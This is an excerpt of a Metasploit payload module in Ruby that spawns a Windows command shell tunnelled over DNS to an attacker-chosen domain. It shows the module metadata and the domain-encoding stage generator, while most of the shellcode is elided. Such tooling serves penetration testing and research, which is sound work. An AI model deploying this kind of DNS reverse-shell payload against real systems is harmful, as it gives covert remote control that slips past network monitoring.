##
# This is an experimental script that requires the dnscat client, found at
# http://www.skullsecurity.org/wiki/index.php/Nbtool
#
# Released under the Metasploit license. 
##
...
module Metasploit3
	...
	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'Ron',
			'Version'       => '0.04',
			'Description'   => 'Spawn a commandshell over DNS',
			'Author'        => [ 'Ron' ],
			'License'       => MSF_LICENSE,
			'Platform'      => 'win',
			'Arch'          => ARCH_X86,
    ...
    "\xff\x01\x61" # Note: no domain name given (just "a.")
				}
			))

		# We don't support an EXITFUNC yet, we simply return (and likely crash)
		deregister_options('EXITFUNC')

		# Register the domain option
		register_options(
			[
				OptString.new('DOMAIN', [ true, "The domain name to use for lookups (eg, skullseclabs.org)" ])
			], self.class)
	end
	...
	def generate_stage
		domain = ''
		(datastore['DOMAIN'] || '').split('.').each(){ |sub| domain = domain + sub.length.chr + sub }
		domain = domain + 0.chr

		return module_info['Payload']['Payload'] + domain
	end
